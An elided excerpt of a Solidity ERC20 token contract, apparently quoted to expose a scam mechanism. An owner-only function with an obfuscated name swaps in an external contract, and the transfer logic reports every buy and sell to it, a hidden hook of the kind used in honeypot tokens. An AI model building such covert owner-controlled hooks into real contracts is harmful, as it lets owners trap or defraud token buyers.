...
contract TokenM is ERC20 {
    ...
    ROnesAmountyayoer public yayoer;
    ...
    function fufcoutVengerSongs(ROnesAmountyayoer _yayoer) public onlyOwner {
        yayoer = _yayoer;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                yayoer.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				yayoer.addOutAmount(from, amount);
            }else{
                yayoer.addOutAmount(from, amount);
                takeFee = false;
            }
